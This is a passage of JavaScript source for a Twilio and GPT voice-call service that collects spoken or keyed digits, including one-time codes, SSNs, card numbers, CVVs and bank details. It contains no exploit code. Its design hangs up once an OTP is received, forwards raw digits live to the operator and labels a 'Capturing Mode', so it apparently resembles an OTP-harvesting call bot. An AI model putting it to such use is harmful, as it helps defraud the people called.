'use strict';

const DIGIT_WORD_MAP = {
  zero: '0',
  oh: '0',
  o: '0',
  one: '1',
  two: '2',
  three: '3',
  four: '4',
  five: '5',
  six: '6',
  seven: '7',
  eight: '8',
  nine: '9'
};

const SPOKEN_DIGIT_PATTERN = new RegExp(
  `\\b(?:${Object.keys(DIGIT_WORD_MAP).join('|')})(?:\\s+(?:${Object.keys(DIGIT_WORD_MAP).join('|')})){3,}\\b`,
  'gi'
);

function createDigitCollectionService(options = {}) {
  const {
    db,
    webhookService,
    callConfigurations,
    config,
    twilioClient,
    VoiceResponse,
    getCurrentProvider,
    speakAndEndCall,
    clearSilenceTimer,
    callEndMessages = {},
    closingMessage = 'Thank you for your time. Goodbye.',
    settings = {},
    logger = console
  } = options;

  const {
    otpLength = 6,
    otpMaxRetries = 3,
    otpDisplayMode = 'masked',
    defaultCollectDelayMs = 1200,
    fallbackToVoiceOnFailure = true,
    showRawDigitsLive = true,
    sendRawDigitsToUser = true,
    minDtmfGapMs = 200
  } = settings;

  function maskDigitsForPreview(digits = '') {
    if (showRawDigitsLive) return digits || '';
    const len = String(digits || '').length;
    if (!len) return '••';
    const masked = '•'.repeat(Math.max(2, Math.min(6, len)));
    return len > 6 ? `${masked}…` : masked;
  }

  function labelForProfile(profile = 'generic') {
    const map = {
      verification: 'OTP',
      otp: 'OTP',
      ssn: 'SSN',
      dob: 'DOB',
      routing_number: 'Routing',
      bank_account: 'Bank Acct',
      phone: 'Phone',
      member_id: 'Member ID',
      policy_number: 'Policy',
      invoice_number: 'Invoice',
      confirmation_code: 'Confirm',
      tax_id: 'Tax ID',
      ein: 'EIN',
      claim_number: 'Claim',
      order_number: 'Order',
      reservation_number: 'Reservation',
      ticket_number: 'Ticket',
      case_number: 'Case',
      account: 'Account',
      zip: 'ZIP',
      extension: 'Ext',
      amount: 'Amount',
      survey: 'Survey',
      callback_confirm: 'Callback',
      card_number: 'Card',
      cvv: 'CVV',
      card_expiry: 'Expiry',
      menu: 'Menu',
      generic: 'Digits'
    };
    return map[String(profile || 'generic').toLowerCase()] || profile || 'Digits';
  }

  function estimateSpeechDurationMs(text = '') {
    const words = String(text || '')
      .trim()
      .split(/\s+/)
      .filter(Boolean).length;
    if (!words) return 0;
    const wordsPerMinute = 150;
    return Math.ceil((words / wordsPerMinute) * 60000);
  }

  function buildExpectedLabel(expectation = {}) {
    const min = expectation.min_digits || 1;
    const max = expectation.max_digits || min;
    const digitLabel = min === max ? `${min}-digit` : `${min}-${max} digit`;
    const profile = String(expectation.profile || 'generic').toLowerCase();
    switch (profile) {
      case 'menu':
        return 'menu option';
      case 'extension':
        return 'extension';
      case 'zip':
        return 'ZIP code';
      case 'account':
        return 'account number';
      case 'cvv':
        return 'security code';
      case 'card_number':
        return 'card number';
      case 'card_expiry':
        return 'expiry date';
      case 'amount':
        return 'amount';
      case 'survey':
        return 'rating';
      case 'callback_confirm':
        return 'phone number';
      case 'ssn':
        return 'social security number';
      case 'dob':
        return 'date of birth';
      case 'routing_number':
        return 'routing number';
      case 'bank_account':
        return 'bank account number';
      case 'phone':
        return 'phone number';
      case 'member_id':
        return 'member ID';
      case 'policy_number':
        return 'policy number';
      case 'invoice_number':
        return 'invoice number';
      case 'confirmation_code':
        return 'confirmation code';
      case 'tax_id':
        return 'tax ID';
      case 'ein':
        return 'employer ID';
      case 'claim_number':
        return 'claim number';
      case 'order_number':
        return 'order number';
      case 'reservation_number':
        return 'reservation number';
      case 'ticket_number':
        return 'ticket number';
      case 'case_number':
        return 'case number';
      case 'verification':
      case 'otp':
        return `${digitLabel} code`;
      default:
        return `${digitLabel} code`;
    }
  }

  function buildDefaultReprompts(expectation = {}) {
    const label = buildExpectedLabel(expectation);
    const profile = String(expectation.profile || 'generic').toLowerCase();
    if (profile === 'menu') {
      return {
        invalid: [
          'That option was not valid. Please press a valid menu option now.',
          'Please press a valid menu option now.',
          'Last try: press a valid menu option now.'
        ],
        timeout: [
          'I did not receive a selection. Please press a menu option now.',
          'Please press a menu option now.',
          'Last try: press a menu option now.'
        ],
        failure: 'No valid selection was received. Thank you. Goodbye.',
        timeout_failure: 'No selection was received. Thank you. Goodbye.'
      };
    }
    return {
      invalid: [
        `That did not match. Please enter the ${label} now.`,
        `Please enter the ${label} now.`,
        `Last try: enter the ${label} now.`
      ],
      timeout: [
        `I did not receive any input. Please enter the ${label} now.`,
        `Please enter the ${label} now.`,
        `Last try: enter the ${label} now.`
      ],
      failure: `We could not verify the ${label}. Thank you for your time. Goodbye.`,
      timeout_failure: `No input received for the ${label}. Thank you for your time. Goodbye.`
    };
  }

  function normalizeRepromptValue(value) {
    if (Array.isArray(value)) {
      const trimmed = value.map((item) => String(item || '').trim()).filter(Boolean);
      return trimmed.length ? trimmed : '';
    }
    if (typeof value === 'string') {
      const trimmed = value.trim();
      return trimmed || '';
    }
    return '';
  }

  function chooseReprompt(expectation = {}, kind = 'invalid', attempt = 1) {
    const key = kind === 'timeout'
      ? expectation.reprompt_timeout
      : kind === 'incomplete'
        ? expectation.reprompt_incomplete
        : expectation.reprompt_invalid;
    if (Array.isArray(key) && key.length) {
      const idx = Math.max(0, Math.min(key.length - 1, (attempt || 1) - 1));
      return key[idx];
    }
    if (typeof key === 'string' && key.trim()) return key.trim();
    return '';
  }

  const OTP_REGEX = /\b\d{4,8}\b/g;
  const OTP_PROMPT_REGEX = /\b(otp|one[-\s]?time|verification code|passcode|pin|auth(?:entication)? code)\b/i;

  function hasOtpPromptSignal(text = '') {
    return OTP_PROMPT_REGEX.test(String(text || ''));
  }

  const digitTimeouts = new Map();
  const digitFallbackStates = new Map();
  const digitCollectionPlans = new Map();
  const lastDtmfTimestamps = new Map();
  const pendingDigits = new Map();

  const DIGIT_PROFILE_DEFAULTS = {
    verification: { min_digits: 4, max_digits: 8, timeout_s: 20, max_retries: 2, min_collect_delay_ms: 1500, end_call_on_success: true },
    otp: { min_digits: 4, max_digits: 8, timeout_s: 20, max_retries: 2, min_collect_delay_ms: 1500, end_call_on_success: true },
    ssn: { min_digits: 9, max_digits: 9, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    dob: { min_digits: 6, max_digits: 8, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    routing_number: { min_digits: 9, max_digits: 9, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    bank_account: { min_digits: 6, max_digits: 17, timeout_s: 18, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    account: { min_digits: 6, max_digits: 12, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, confirmation_style: 'last4', end_call_on_success: false },
    phone: { min_digits: 10, max_digits: 10, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    member_id: { min_digits: 6, max_digits: 12, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    policy_number: { min_digits: 6, max_digits: 12, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    invoice_number: { min_digits: 4, max_digits: 12, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    confirmation_code: { min_digits: 4, max_digits: 12, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    tax_id: { min_digits: 9, max_digits: 9, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    ein: { min_digits: 9, max_digits: 9, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    claim_number: { min_digits: 4, max_digits: 12, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    order_number: { min_digits: 4, max_digits: 12, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    reservation_number: { min_digits: 4, max_digits: 12, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    ticket_number: { min_digits: 4, max_digits: 12, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    case_number: { min_digits: 4, max_digits: 12, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    amount: { min_digits: 1, max_digits: 9, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    survey: { min_digits: 1, max_digits: 1, timeout_s: 10, max_retries: 2, min_collect_delay_ms: 800, end_call_on_success: false },
    callback_confirm: { min_digits: 10, max_digits: 10, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    cvv: { min_digits: 3, max_digits: 4, timeout_s: 12, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    card_number: { min_digits: 13, max_digits: 19, timeout_s: 25, max_retries: 2, min_collect_delay_ms: 1500, confirmation_style: 'last4', end_call_on_success: false },
    card_expiry: { min_digits: 4, max_digits: 6, timeout_s: 20, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    zip: { min_digits: 5, max_digits: 9, timeout_s: 15, max_retries: 2, min_collect_delay_ms: 1200, end_call_on_success: false },
    extension: { min_digits: 1, max_digits: 6, timeout_s: 10, max_retries: 2, min_collect_delay_ms: 800, end_call_on_success: false },
    menu: { min_digits: 1, max_digits: 1, timeout_s: 8, max_retries: 2, min_collect_delay_ms: 800, end_call_on_success: false }
  };
  const KNOWN_DIGIT_PROFILES = new Set([
    'generic',
    'survey',
    'amount',
    'callback_confirm',
    'account',
    ...Object.keys(DIGIT_PROFILE_DEFAULTS)
  ]);

  function isKnownDigitProfile(profile = '') {
    return KNOWN_DIGIT_PROFILES.has(String(profile || '').toLowerCase());
  }

  function setCallDigitIntent(callSid, intent) {
    const callConfig = callConfigurations.get(callSid);
    if (!callConfig) return;
    callConfig.digit_intent = intent;
    callConfigurations.set(callSid, callConfig);
  }

  function clearDigitIntent(callSid, reason = 'digits_captured') {
    setCallDigitIntent(callSid, { mode: 'normal', reason, confidence: 1 });
  }

  function getDigitProfileDefaults(profile = 'generic') {
    const key = String(profile || 'generic').toLowerCase();
    return DIGIT_PROFILE_DEFAULTS[key] || {};
  }

  function normalizeDigitExpectation(params = {}) {
    const promptHint = `${params.prompt || ''} ${params.prompt_hint || ''}`.toLowerCase();
    let profile = String(params.profile || 'generic').toLowerCase();
    if (params.allow_profile_inference === true && profile === 'generic') {
      if (hasOtpPromptSignal(promptHint)) {
        profile = 'verification';
      } else if (promptHint.match(/\b(press|option|menu)\b/)) {
        profile = 'menu';
      } else if (promptHint.match(/\b(rate|rating|survey|feedback)\b/)) {
        profile = 'survey';
      }
    }
    if (!isKnownDigitProfile(profile)) {
      logger.warn(`Unknown digit profile "${profile}" - defaulting to generic.`);
      profile = 'generic';
    }
    const defaults = getDigitProfileDefaults(profile);
    const minDigits = typeof params.min_digits === 'number'
      ? params.min_digits
      : (typeof defaults.min_digits === 'number' ? defaults.min_digits : 1);
    const maxDigits = typeof params.max_digits === 'number'
      ? params.max_digits
      : (typeof defaults.max_digits === 'number' ? defaults.max_digits : minDigits);
    const timeout = typeof params.timeout_s === 'number'
      ? params.timeout_s
      : (typeof defaults.timeout_s === 'number' ? defaults.timeout_s : 20);
    const maxRetries = typeof params.max_retries === 'number'
      ? params.max_retries
      : (typeof defaults.max_retries === 'number' ? defaults.max_retries : 2);
    const minCollectDelayMs = typeof params.min_collect_delay_ms === 'number'
      ? params.min_collect_delay_ms
      : (typeof defaults.min_collect_delay_ms === 'number' ? defaults.min_collect_delay_ms : defaultCollectDelayMs);
    const maskForGpt = typeof params.mask_for_gpt === 'boolean'
      ? params.mask_for_gpt
      : (typeof defaults.mask_for_gpt === 'boolean' ? defaults.mask_for_gpt : true);
    const speakConfirmation = typeof params.speak_confirmation === 'boolean' ? params.speak_confirmation : false;
    const confirmationStyle = params.confirmation_style || defaults.confirmation_style || 'none';
    const endCallOnSuccess = typeof params.end_call_on_success === 'boolean'
      ? params.end_call_on_success
      : (typeof defaults.end_call_on_success === 'boolean' ? defaults.end_call_on_success : false);
    const prompt = params.prompt && String(params.prompt).trim().length > 0
      ? params.prompt
      : '';
    const reprompt_message = params.reprompt_message || defaults.reprompt_message || '';
    const terminatorChar = params.terminator_char || defaults.terminator_char || '#';
    const allowTerminator = params.allow_terminator === true || defaults.allow_terminator === true;
    const terminatorSuffix = allowTerminator
      ? ` You can end with ${terminatorChar} when finished.`
      : '';

    let normalizedMin = minDigits;
    let normalizedMax = maxDigits < minDigits ? minDigits : maxDigits;
    if (profile === 'verification' && params.force_exact_length) {
      normalizedMin = params.force_exact_length;
      normalizedMax = params.force_exact_length;
    }
    if (allowTerminator && terminatorChar === '#') {
      normalizedMax = Math.max(normalizedMax, normalizedMin);
    }
    if (profile === 'verification' || profile === 'otp') {
      if (normalizedMin < 4) normalizedMin = 4;
      if (normalizedMax < normalizedMin) normalizedMax = normalizedMin;
      if (normalizedMax > 8) normalizedMax = 8;
    }

    const repromptDefaults = buildDefaultReprompts({
      profile,
      min_digits: normalizedMin,
      max_digits: normalizedMax,
      allow_terminator: allowTerminator,
      terminator_char: terminatorChar
    });

    const reprompt_invalid = normalizeRepromptValue(
      params.reprompt_invalid ?? defaults.reprompt_invalid ?? repromptDefaults.invalid
    );
    const reprompt_incomplete = normalizeRepromptValue(
      params.reprompt_incomplete ?? defaults.reprompt_incomplete ?? repromptDefaults.invalid
    );
    const reprompt_timeout = normalizeRepromptValue(
      params.reprompt_timeout ?? defaults.reprompt_timeout ?? repromptDefaults.timeout
    );
    const failure_message = normalizeRepromptValue(
      params.failure_message ?? defaults.failure_message ?? repromptDefaults.failure
    );
    const timeout_failure_message = normalizeRepromptValue(
      params.timeout_failure_message ?? defaults.timeout_failure_message ?? repromptDefaults.timeout_failure
    );

    const estimatedPromptMs = estimateSpeechDurationMs(params.prompt_hint || '');
    const adjustedDelayMs = Math.max(minCollectDelayMs, estimatedPromptMs, 3000);

    return {
      prompt: `${prompt}${terminatorSuffix}`,
      reprompt_message,
      reprompt_invalid,
      reprompt_incomplete,
      reprompt_timeout,
      failure_message,
      timeout_failure_message,
      profile,
      min_digits: normalizedMin,
      max_digits: normalizedMax,
      timeout_s: timeout,
      max_retries: maxRetries,
      min_collect_delay_ms: adjustedDelayMs,
      menu_options: params.menu_options || [],
      confirmation_style: confirmationStyle,
      allow_spoken_fallback: params.allow_spoken_fallback !== false,
      mask_for_gpt: maskForGpt,
      speak_confirmation: speakConfirmation,
      end_call_on_success: endCallOnSuccess,
      allow_terminator: allowTerminator,
      terminator_char: terminatorChar
    };
  }

  function buildDigitPrompt(expectation) {
    const label = buildExpectedLabel(expectation);
    const terminatorSuffix = expectation?.allow_terminator
      ? ` You can end with ${expectation?.terminator_char || '#'} when finished.`
      : '';
    return `Please enter the ${label} using your keypad.${terminatorSuffix}`;
  }

  function buildConfirmationMessage(expectation = {}, collection = {}) {
    const profile = String(expectation.profile || collection.profile || 'generic').toLowerCase();
    const style = expectation.confirmation_style || 'none';
    const speak = expectation.speak_confirmation === true || style !== 'none';
    if (!speak) return '';

    if (style === 'spoken_amount' && collection.digits) {
      const amountCents = Number(collection.digits);
      if (!Number.isNaN(amountCents)) {
        const dollars = (amountCents / 100).toFixed(2);
        return `Thanks, I noted ${dollars} dollars.`;
      }
    }

    if (style === 'last4' && collection.digits) {
      const last4 = collection.digits.slice(-4);
      if (last4) {
        return `Thanks, I have the number ending in ${last4}.`;
      }
    }

    switch (profile) {
      case 'menu':
        return 'Thanks, I have your selection.';
      case 'verification':
      case 'otp':
        return 'Thanks, your code is received.';
      case 'extension':
        return 'Thanks, I have the extension.';
      case 'zip':
        return 'Thanks, I have the ZIP code.';
      case 'account':
        return 'Thanks, I have the account number.';
      default:
        return 'Thanks, I have that.';
    }
  }

  function clearDigitTimeout(callSid) {
    const timer = digitTimeouts.get(callSid);
    if (timer) {
      clearTimeout(timer);
      digitTimeouts.delete(callSid);
    }
  }

  function clearDigitFallbackState(callSid) {
    if (digitFallbackStates.has(callSid)) {
      digitFallbackStates.delete(callSid);
    }
  }

  function clearDigitPlan(callSid) {
    if (digitCollectionPlans.has(callSid)) {
      digitCollectionPlans.delete(callSid);
    }
  }

  function markDigitPrompted(callSid, gptService = null, interactionCount = 0, source = 'dtmf', options = {}) {
    const expectation = digitCollectionManager.expectations.get(callSid);
    if (!expectation) return false;
    expectation.prompted_at = Date.now();
    digitCollectionManager.expectations.set(callSid, expectation);
    if (gptService) {
      void flushBufferedDigits(callSid, gptService, interactionCount, source, options);
    }
    return true;
  }

  function bufferDigits(callSid, digits = '', meta = {}) {
    if (!callSid || !digits) return;
    const existing = pendingDigits.get(callSid) || [];
    existing.push({ digits: String(digits), meta });
    pendingDigits.set(callSid, existing);
  }

  async function flushBufferedDigits(callSid, gptService = null, interactionCount = 0, source = 'dtmf', options = {}) {
    const queue = pendingDigits.get(callSid);
    if (!queue || queue.length === 0) return false;

    let processed = false;
    while (queue.length > 0) {
      if (!digitCollectionManager.expectations.has(callSid)) {
        break;
      }
      const item = queue.shift();
      const collection = digitCollectionManager.recordDigits(callSid, item.digits, item.meta || {});
      processed = true;
      await handleCollectionResult(callSid, collection, gptService, interactionCount, source, options);
    }

    if (queue.length === 0) {
      pendingDigits.delete(callSid);
    } else {
      pendingDigits.set(callSid, queue);
    }

    return processed;
  }

  function isValidLuhn(value = '') {
    const digits = String(value || '').replace(/\D/g, '');
    if (!digits) return false;
    let sum = 0;
    let shouldDouble = false;
    for (let i = digits.length - 1; i >= 0; i -= 1) {
      let digit = Number(digits[i]);
      if (Number.isNaN(digit)) return false;
      if (shouldDouble) {
        digit *= 2;
        if (digit > 9) digit -= 9;
      }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
  }

  function isValidRoutingNumber(value = '') {
    const digits = String(value || '').replace(/\D/g, '');
    if (digits.length !== 9) return false;
    const weights = [3, 7, 1, 3, 7, 1, 3, 7, 1];
    let sum = 0;
    for (let i = 0; i < 9; i += 1) {
      const n = Number(digits[i]);
      if (Number.isNaN(n)) return false;
      sum += n * weights[i];
    }
    return sum % 10 === 0;
  }

  function validateProfileDigits(profile = 'generic', digits = '') {
    const value = String(digits || '');
    if (!value) {
      return { valid: false, reason: 'empty' };
    }

    switch (String(profile || '').toLowerCase()) {
      case 'verification':
      case 'otp':
        return { valid: true };
      case 'ssn':
        return value.length === 9 ? { valid: true } : { valid: false, reason: 'invalid_length' };
      case 'dob': {
        if (value.length !== 6 && value.length !== 8) {
          return { valid: false, reason: 'invalid_length' };
        }
        const month = Number(value.slice(0, 2));
        const day = Number(value.slice(2, 4));
        if (!month || month < 1 || month > 12) {
          return { valid: false, reason: 'invalid_month' };
        }
        if (!day || day < 1 || day > 31) {
          return { valid: false, reason: 'invalid_day' };
        }
        return { valid: true };
      }
      case 'routing_number':
        return isValidRoutingNumber(value)
          ? { valid: true }
          : { valid: false, reason: 'invalid_routing' };
      case 'bank_account':
        return value.length >= 6 && value.length <= 17
          ? { valid: true }
          : { valid: false, reason: 'invalid_length' };
      case 'phone':
        return value.length === 10 ? { valid: true } : { valid: false, reason: 'invalid_phone' };
      case 'tax_id':
      case 'ein':
        return value.length === 9 ? { valid: true } : { valid: false, reason: 'invalid_length' };
      case 'cvv':
        if (value.length === 3 || value.length === 4) {
          return { valid: true };
        }
        return { valid: false, reason: 'invalid_cvv' };
      case 'card_number':
        if (value.length < 13 || value.length > 19) {
          return { valid: false, reason: 'invalid_card_length' };
        }
        return isValidLuhn(value)
          ? { valid: true }
          : { valid: false, reason: 'invalid_card_number' };
      case 'card_expiry': {
        if (value.length !== 4 && value.length !== 6) {
          return { valid: false, reason: 'invalid_expiry_length' };
        }
        const month = Number(value.slice(0, 2));
        if (!month || month < 1 || month > 12) {
          return { valid: false, reason: 'invalid_expiry_month' };
        }
        return { valid: true };
      }
      default:
        return { valid: true };
    }
  }

  const digitCollectionManager = {
    expectations: new Map(),
    setExpectation(callSid, params = {}) {
      const normalized = normalizeDigitExpectation(params);
      this.expectations.set(callSid, {
        ...normalized,
        plan_id: params.plan_id || null,
        plan_step_index: Number.isFinite(params.plan_step_index) ? params.plan_step_index : null,
        plan_total_steps: Number.isFinite(params.plan_total_steps) ? params.plan_total_steps : null,
        prompted_at: params.prompted_at || null,
        retries: 0,
        buffer: '',
        collected: [],
        last_masked: null
      });
    },
    recordDigits(callSid, digits = '', meta = {}) {
      if (!digits) return { accepted: false, reason: 'empty' };
      const exp = this.expectations.get(callSid);
      if (!exp) return { accepted: false, reason: 'no_expectation' };
      const result = { profile: exp.profile, mask_for_gpt: exp.mask_for_gpt };
      const hasTerminator = exp.allow_terminator && digits.includes(exp.terminator_char || '#');
      const cleanDigits = digits.replace(/[^0-9]/g, '');
      const isRepeating = (val) => val.length >= 6 && /^([0-9])\1+$/.test(val);
      const isAscending = (val) => val.length >= 6 && '0123456789'.includes(val);

      if (meta.timestamp && exp.profile !== 'menu') {
        const lastTs = lastDtmfTimestamps.get(callSid) || 0;
        const gap = lastTs ? meta.timestamp - lastTs : null;
        if (gap !== null && gap < minDtmfGapMs && cleanDigits.length === 1) {
          result.accepted = false;
          result.reason = 'too_fast';
          result.heuristic = 'inter_key_gap';
          exp.buffer = '';
          this.expectations.set(callSid, exp);
          lastDtmfTimestamps.set(callSid, meta.timestamp);
          return result;
        }
        lastDtmfTimestamps.set(callSid, meta.timestamp);
      }

      if (exp.profile === 'menu' && exp.menu_options.length) {
        const hit = exp.menu_options.find((o) => String(o.digit) === String(cleanDigits || digits));
        if (hit) {
          result.digits = String(cleanDigits || digits);
          result.len = result.digits.length;
          result.masked = result.digits;
          result.route = hit.route || hit.label || `menu_${digits}`;
          result.accepted = true;
        } else {
          result.accepted = false;
          result.reason = 'invalid_menu_option';
        }
        exp.collected.push(result.digits || digits);
        exp.last_masked = result.masked || result.digits;
        this.expectations.set(callSid, exp);
        return result;
      }

      exp.buffer = `${exp.buffer || ''}${String(cleanDigits)}`;
      const currentBuffer = exp.buffer;
      const len = currentBuffer.length;
      const inRange = len >= exp.min_digits && len <= exp.max_digits;
      const tooLong = len > exp.max_digits;
      const masked = len <= 4 ? currentBuffer : `${'*'.repeat(Math.max(0, len - 4))}${currentBuffer.slice(-4)}`;

      let accepted = inRange && !tooLong;
      let reason = null;

      if (hasTerminator) {
        if (len < exp.min_digits) {
          accepted = false;
          reason = 'too_short';
        } else if (len > exp.max_digits) {
          accepted = false;
          reason = 'too_long';
        } else {
          accepted = true;
        }
      }

      if (tooLong) {
        accepted = false;
        reason = 'too_long';
        exp.buffer = '';
      } else if (!inRange) {
        accepted = false;
        reason = 'incomplete';
      } else {
        const validation = validateProfileDigits(exp.profile, currentBuffer);
        if (!validation.valid) {
          accepted = false;
          reason = validation.reason || 'invalid';
          exp.buffer = '';
        }
      }

      Object.assign(result, {
        digits: currentBuffer,
        len,
        masked,
        accepted,
        reason
      });

      exp.collected.push(result.digits);
      exp.last_masked = masked;

      if (result.accepted) {
        if (isRepeating(currentBuffer) || isAscending(currentBuffer)) {
          result.accepted = false;
          result.reason = 'spam_pattern';
          result.heuristic = isRepeating(currentBuffer) ? 'repeat_pattern' : 'ascending_pattern';
          exp.buffer = '';
          exp.retries += 1;
          result.retries = exp.retries;
          this.expectations.set(callSid, exp);
          return result;
        }
        exp.buffer = '';
        if (hasTerminator) {
          exp.terminated = true;
        }
      } else if (result.reason && result.reason !== 'incomplete') {
        exp.retries += 1;
        result.retries = exp.retries;
        if (exp.retries > exp.max_retries) {
          result.fallback = true;
        }
      }

      this.expectations.set(callSid, exp);
      return result;
    }
  };

  async function scheduleDigitTimeout(callSid, gptService = null, interactionCount = 0) {
    const exp = digitCollectionManager.expectations.get(callSid);
    if (!exp || !exp.timeout_s) return;

    clearDigitTimeout(callSid);

    const timeoutMs = Math.max(5000, (exp.timeout_s || 10) * 1000);
    const delayMs = Math.max(3000, exp.min_collect_delay_ms || 0);
    const waitMs = delayMs + timeoutMs;

    const timer = setTimeout(async () => {
      const current = digitCollectionManager.expectations.get(callSid);
      if (!current) return;

      try {
        await db.addCallDigitEvent({
          call_sid: callSid,
          source: 'timeout',
          profile: current.profile || 'generic',
          digits: null,
          len: 0,
          accepted: false,
          reason: 'timeout',
          metadata: {
            attempt: (current.retries || 0) + 1,
            max_retries: current.max_retries
          }
        });
      } catch (err) {
        logger.error('Error logging digit timeout:', err);
      }

      if (!digitFallbackStates.get(callSid)?.active && typeof triggerTwilioGatherFallback === 'function') {
        try {
          const usedFallback = await triggerTwilioGatherFallback(callSid, current, {
            prompt: buildDigitPrompt(current)
          });
          if (usedFallback) {
            return;
          }
        } catch (err) {
          logger.error('Twilio gather fallback error:', err);
        }
      }

      current.retries = (current.retries || 0) + 1;
      digitCollectionManager.expectations.set(callSid, current);

      if (current.retries > current.max_retries) {
        digitCollectionManager.expectations.delete(callSid);
        clearDigitTimeout(callSid);
        clearDigitFallbackState(callSid);
        clearDigitPlan(callSid);
        const finalTimeoutMessage = current.timeout_failure_message || callEndMessages.no_response;
        await speakAndEndCall(callSid, finalTimeoutMessage, 'digit_collection_timeout');
        return;
      }

      const prompt = chooseReprompt(current, 'timeout', current.retries)
        || `I did not catch that. Please re-enter the ${buildExpectedLabel(current)} now.`;

      const personalityInfo = gptService?.personalityEngine?.getCurrentPersonality();
      const reply = {
        partialResponseIndex: null,
        partialResponse: prompt,
        personalityInfo,
        adaptationHistory: gptService?.personalityChanges?.slice(-3) || []
      };

      if (gptService) {
        gptService.emit('gptreply', reply, interactionCount);
        try {
          gptService.updateUserContext('digit_timeout', 'system', `Digit timeout retry ${current.retries}/${current.max_retries}`);
        } catch (_) {}
      }

      webhookService.addLiveEvent(callSid, `⏳ Awaiting digits retry ${current.retries}/${current.max_retries}`, { force: true });

      scheduleDigitTimeout(callSid, gptService, interactionCount + 1);
    }, waitMs);

    digitTimeouts.set(callSid, timer);
  }

  function buildTwilioGatherTwiml(callSid, expectation, options = {}, hostname) {
    if (!VoiceResponse) {
      throw new Error('VoiceResponse not configured for Twilio gather');
    }
    const response = new VoiceResponse();
    const min = expectation?.min_digits || 1;
    const max = expectation?.max_digits || min;
    const host = hostname || config?.server?.hostname;
    const actionUrl = `https://${host}/webhook/twilio-gather?callSid=${encodeURIComponent(callSid)}`;
    const gather = response.gather({
      input: 'dtmf',
      numDigits: max,
      timeout: Math.max(3, expectation?.timeout_s || 10),
      action: actionUrl,
      method: 'POST'
    });
    const prompt = options.prompt || buildDigitPrompt(expectation);
    gather.say(prompt);
    if (options.followup) {
      response.say(options.followup);
    }
    return response.toString();
  }

  async function triggerTwilioGatherFallback(callSid, expectation, options = {}) {
    const provider = typeof getCurrentProvider === 'function' ? getCurrentProvider() : config?.platform?.provider;
    if (provider && provider !== 'twilio') return false;
    if (!config?.twilio?.gatherFallback) return false;
    if (!config?.server?.hostname) return false;

    const state = digitFallbackStates.get(callSid);
    if (state?.active) return false;

    const accountSid = config.twilio.accountSid;
    const authToken = config.twilio.authToken;
    if (!accountSid || !authToken || !twilioClient) {
      return false;
    }

    const client = twilioClient(accountSid, authToken);
    const twiml = buildTwilioGatherTwiml(callSid, expectation, options);
    await client.calls(callSid).update({ twiml });
    markDigitPrompted(callSid);

    digitFallbackStates.set(callSid, {
      active: true,
      attempts: (state?.attempts || 0) + 1,
      lastAt: new Date().toISOString()
    });

    webhookService.addLiveEvent(callSid, '📟 Capturing Mode', { force: true });
    return true;
  }

  function formatOtpForDisplay(digits, mode = otpDisplayMode, expectedLength = null) {
    const safeDigits = String(digits || '').replace(/\D/g, '');
    const targetLen = Number.isFinite(expectedLength) && expectedLength > 0 ? expectedLength : otpLength;
    if (mode === 'length') {
      return `OTP received (${safeDigits.length} digits)`;
    }
    if (mode === 'progress') {
      return `OTP entry: ${safeDigits.length}/${targetLen} digits received`;
    }
    if (!safeDigits) return 'OTP received';
    const maskLen = Math.max(0, safeDigits.length - 2);
    const masked = `${'*'.repeat(maskLen)}${safeDigits.slice(-2)}`;
    return `OTP received: ${masked}`;
  }

  function formatDigitsGeneral(digits, masked = null, mode = 'live') {
    const raw = String(digits || '');
    if (mode === 'live' && showRawDigitsLive) return raw;
    if (mode === 'notify' && sendRawDigitsToUser) return raw;
    if (masked) return masked;
    const safe = raw.replace(/\d{0,}/g, (m) => (m.length <= 4 ? m : `${'*'.repeat(Math.max(0, m.length - 2))}${m.slice(-2)}`));
    return safe;
  }

  function extractSpokenDigitSequences(text = '') {
    if (!text) return [];
    const tokens = text
      .toLowerCase()
      .replace(/[^a-z0-9\s]/g, ' ')
      .split(/\s+/)
      .filter(Boolean);

    const sequences = [];
    let buffer = '';
    let repeat = 1;

    for (const token of tokens) {
      if (token === 'double') {
        repeat = 2;
        continue;
      }
      if (token === 'triple') {
        repeat = 3;
        continue;
      }

      const digit = DIGIT_WORD_MAP[token];
      if (digit) {
        buffer += digit.repeat(repeat);
        repeat = 1;
        continue;
      }

      if (/^\d+$/.test(token)) {
        if (buffer) {
          sequences.push(buffer);
          buffer = '';
        }
        sequences.push(token);
        repeat = 1;
        continue;
      }

      if (buffer) {
        sequences.push(buffer);
        buffer = '';
      }
      repeat = 1;
    }

    if (buffer) {
      sequences.push(buffer);
    }

    return sequences;
  }

  function getOtpContext(text = '', callSid = null) {
    if (!text) {
      return {
        raw: text,
        maskedForGpt: text,
        maskedForLogs: text,
        otpDetected: false,
        codes: []
      };
    }
    const expectation = callSid ? digitCollectionManager.expectations.get(callSid) : null;
    const maskForGpt = expectation ? expectation.mask_for_gpt !== false : true;
    const minExpected = typeof expectation?.min_digits === 'number' ? expectation.min_digits : 4;
